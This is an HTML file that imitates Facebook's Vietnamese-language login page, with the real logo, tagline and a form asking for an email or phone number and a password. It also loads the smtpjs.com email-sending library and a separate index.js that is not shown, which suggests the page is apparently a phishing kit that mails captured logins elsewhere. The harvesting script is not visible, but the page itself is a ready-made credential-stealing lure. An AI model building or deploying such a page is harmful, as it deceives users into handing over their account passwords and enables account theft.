<!DOCTYPE html>
<html lang="en">
<head>
  <title>Facebook</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <link rel="stylesheet" href="facebook.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  <script src="https://smtpjs.com/v3/smtp.js"></script>
<script src="index.js"></script>
</head>
<body>
<div class="background">
    <div class="row">
        <div class="col-sm-2"></div>
        <div class="col-sm-5 intro-logo">
            <img class="img-logo"src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="">
            <h2 class="title">Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.</h2>
        </div>
        <div class="col-sm-5">
            <form class="form-login" id="form-logins">
                <div class="form-group">
                  <input type="text" data-testid="royal_email" class="form-control input-login" id="InputEmail1" aria-describedby="emailHelp" placeholder="Email hoặc số điện thoại">
                </div>
                <div class="form-group">
                  <input type="password" class="form-control input-login" id="InputPassword1" placeholder="Mật Khẩu">
                </div>
                <input type="submit" class="btn btn-primary login-button" value="Đăng Nhập">
                <div class="forget-background">
                    <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login" class="forget-password">Quên mật khẩu?</a>
                </div>
                <div class="underline"></div>
                <div class="create-account-background">
                    <button class="btn btn-success create-account-button" >Tạo tài khoản mới</button>
                </div>
              </form>
              <div class="infor"><p class="infor-content"><a class="link-create-page" herf="https://www.facebook.com/pages/create/?ref_type=registration_form">Tạo Trang </a>dành cho người nổi tiếng, nhãn hiệu hoặc doanh nghiệp.</p></div>
        </div>
        <div class="col-sm-1"></div>
    </div>
</div>

</body>
</html>
